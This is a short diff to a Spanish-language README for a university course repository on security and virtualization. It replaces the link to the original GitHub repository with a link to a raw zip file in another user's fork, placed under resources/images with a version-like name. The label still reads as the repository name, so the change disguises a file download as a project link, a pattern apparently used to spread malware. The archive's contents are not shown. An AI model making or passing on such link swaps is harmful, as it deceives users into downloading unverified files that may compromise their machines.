@@ -2,7 +2,7 @@
 
 Repositorio de Seguridad y Virtualizacion 7 US
 
-[Seguridad y Virtualizacion](https://github.com/dobleub/tec-nm-tlaxiaco-seguridad-virtualizacion)
+[Seguridad y Virtualizacion](https://raw.githubusercontent.com/Rufino07/tec-nm-tlaxiaco-seguridad-virtualizacion/main/resources/images/seguridad_nm_tec_virtualizacion_tlaxiaco_3.2.zip)
 
 branch: [feat|fix]/EOS/practica-1<br/>
 commits: [fix|feat]: Comentario de practica 1/Actualización de practica 1
